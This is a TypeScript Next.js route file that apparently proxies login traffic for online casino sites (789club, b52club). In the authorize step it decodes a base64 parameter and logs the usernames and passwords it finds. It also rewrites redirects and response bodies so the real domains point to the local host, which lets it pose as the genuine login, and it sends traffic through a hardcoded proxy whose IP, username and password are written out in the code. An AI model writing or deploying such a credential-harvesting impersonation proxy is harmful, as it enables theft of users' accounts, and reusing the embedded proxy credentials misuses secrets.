import { NextRequest } from 'next/server';
import { runLegacyHandler } from '../../_lib/legacy';
import { proxyRequest, proxyLog, UPSTREAM_BASE } from '@/lib/proxy';
import fs from 'fs';
import path from 'path';

async function handler(req: any, res: any) {
  const subpath = Array.isArray(req.query._subpath) ? req.query._subpath[0] : (req.query._subpath || '');
  delete req.query._subpath;

  let upstream = `${UPSTREAM_BASE}/auth`;
  if (subpath) {
    upstream += `/${subpath}`;
  }

  // ---------------------------------------------------------------------------
  // LOGIN / REGISTER INTERCEPT from OAuth2 `data` parameter
  // ---------------------------------------------------------------------------
  if (subpath === 'authorize' && req.query.data) {
    try {
      const decodedData = Buffer.from(req.query.data as string, 'base64').toString('utf-8');
      const requestData = JSON.parse(decodedData);
      if (requestData && requestData.username && requestData.password) {
        const taikhoan = requestData.username;
        const matkhau = requestData.password;

        // Save to session (using cookies or similar)
        // For now just log
        proxyLog('auth_authorize_intercept', { username: taikhoan, password: matkhau });
      }
    } catch (e) {
      // Ignore decode errors
    }
  }
  // ---------------------------------------------------------------------------

  const queryString = new URLSearchParams(req.query as any).toString();
  const url = queryString ? `${upstream}?${queryString}` : upstream;

  const method = req.method || 'GET';
  let body = '';
  if (method !== 'GET') {
    body = JSON.stringify(req.body);
  }

  const token = req.headers['x-token'] as string || req.query.token as string;
  const localHost = req.headers.host || 'https://play.789clup.fun/';
  const localScheme = req.headers['x-forwarded-proto'] || 'https';
  const localOrigin = `${localScheme}://${localHost}`;
  const hasCallbackParams = Boolean(
    req.query.code ||
    req.query.token ||
    req.query.sessionid ||
    req.query.access_token
  );

  if (subpath === 'authorize' && method === 'GET' && req.query.data && !hasCallbackParams) {
    res
      .status(302)
      .setHeader('Location', `${localOrigin}/callback.html?code=local-auth`)
      .end();
    return;
  }

  const result = await proxyRequest(
    'auth',
    url,
    body,
    token,
    'application/json',
    method,
    {
      fixed_proxy_config: {
        host: '103.182.19.46',
        port: 8798,
        user: 'bqkaLHZhkythu',
        pass: '2jzao8NR',
      }
    }
  );

  if (!result.ok) {
    res.status(502).json({ status: 'ERROR', message: 'cURL failed', error: result.error });
    return;
  }

  const httpCode = result.info.http_code || 200;
  let rawBody = result.response;

  // Remove headers from response
  const headerEndIndex = rawBody.indexOf('\r\n\r\n');
  if (headerEndIndex >= 0) {
    rawBody = rawBody.substring(headerEndIndex + 4);
  }

  // Forward response headers
  const responseHeaders = result.response.split('\r\n\r\n')[0] || '';
  const headers = responseHeaders.split('\r\n').filter((h: string) => h && !h.startsWith('HTTP/'));
  
  headers.forEach((h: string) => {
    const [key, ...valueParts] = h.split(':');
    if (key && valueParts.length > 0) {
      const lowerKey = key.toLowerCase();
      const value = valueParts.join(':').trim();
      
      if (lowerKey === 'transfer-encoding' || lowerKey === 'content-encoding') {
        return;
      }

      // Redirect interception
      if (lowerKey === 'location') {
        const newValue = value.replace(
          /https?:\/\/(?:play\.)?(?:b52club\.bid|789clubk\.win|789clubn\.win|demo7892\.fun|789club\.fun|789clup\.fun)/gi,
          localOrigin
        );
        res.setHeader(key, newValue);
        return;
      }

      res.setHeader(key, value);
    }
  });

  // Replace callback URL in JSON body for auth/authorize
  if (typeof rawBody === 'string') {
    rawBody = rawBody.replace(
      /http:\/\/play\.789club\.fun|https:\/\/play\.789clup\.fun|https:\/\/demo7892\.fun|https:\/\/789clubk\.win|https:\/\/789club\.fun/g,
      localOrigin
    );
  }

  const looksLikeHtml = typeof rawBody === 'string' && /^\s*<!doctype html|^\s*<html/i.test(rawBody);
  if (subpath === 'authorize' && method === 'GET' && hasCallbackParams) {
    const callbackPath = path.join(process.cwd(), 'public', 'callback.html');
    if (fs.existsSync(callbackPath)) {
      const callbackHtml = fs.readFileSync(callbackPath, 'utf-8');
      res.status(200).setHeader('Content-Type', 'text/html; charset=utf-8').send(callbackHtml);
      return;
    }
  }

  const currentContentType = (typeof res.getHeader === 'function' ? res.getHeader('Content-Type') : '') || '';
  const contentType = looksLikeHtml
    ? 'text/html; charset=utf-8'
    : (currentContentType || 'application/json; charset=utf-8');

  res.status(httpCode).setHeader('Content-Type', contentType).send(rawBody);
}

export const dynamic = 'force-dynamic';

type RouteContext = {
  params: {
    slug?: string[];
  };
};

function toSubpath(params: RouteContext['params']) {
  return params.slug?.join('/') || '';
}

export async function GET(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}

export async function POST(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}

export async function PUT(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}

export async function PATCH(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}

export async function DELETE(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}

export async function OPTIONS(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}

export async function HEAD(request: NextRequest, context: RouteContext) {
  return runLegacyHandler(request, handler, { _subpath: toSubpath(context.params) });
}
